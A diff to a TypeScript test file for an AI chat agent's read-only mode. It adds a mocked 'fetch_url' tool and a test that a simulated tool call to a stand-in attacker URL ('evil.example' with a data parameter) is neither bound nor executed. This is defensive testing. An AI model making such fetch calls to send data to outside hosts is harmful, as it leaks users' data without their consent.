@@ -44,6 +44,10 @@ const {
   describeMutationMock: vi.fn((name: string) => `describe ${name}`),
 }));
 
+const { fetchUrlInvokeMock } = vi.hoisted(() => ({
+  fetchUrlInvokeMock: vi.fn().mockResolvedValue("page body"),
+}));
+
 vi.mock("@langchain/anthropic", () => ({ ChatAnthropic: chatAnthropicMock }));
 
 vi.mock("@langchain/langgraph", async (importOriginal) => {
@@ -57,6 +61,7 @@ vi.mock("@/agents/chat/tools", () => ({
   buildChatTools: () => [
     { name: "create_competitor", mutating: true, tool: { invoke: createCompetitorInvokeMock } },
     { name: "list_competitors", mutating: false, tool: { invoke: listCompetitorsInvokeMock } },
+    { name: "fetch_url", mutating: false, tool: { invoke: fetchUrlInvokeMock } },
   ],
 }));
 
@@ -182,6 +187,20 @@ describe("agents/chat/chat-graph — HITL mutation gate", () => {
 
     expect(interruptMock).not.toHaveBeenCalled();
     expect(listCompetitorsInvokeMock).toHaveBeenCalledWith({});
+  });
+
+  dbIt("read-only binds neither mutating tools nor fetch_url, and refuses a fetch_url call", async () => {
+    streamMock
+      .mockImplementationOnce(streamOf(toolCallChunk("fetch_url", { url: "https://evil.example/?d=x" }, "call-1")))
+      .mockImplementationOnce(streamOf(answerChunk("Okay.")));
+
+    await invoke(true);
+
+    const bound = bindToolsMock.mock.calls[0][0] as Array<{ invoke?: unknown }>;
+    expect(bound.some((t) => t.invoke === fetchUrlInvokeMock)).toBe(false);
+    expect(fetchUrlInvokeMock).not.toHaveBeenCalled();
+    const secondCall = streamMock.mock.calls[1][0] as Array<{ content: string; tool_call_id?: string }>;
+    expect(secondCall.find((m) => m.tool_call_id === "call-1")?.content).toContain("unknown tool");
   });
 
   dbIt("read-only binds no mutating tools", async () => {
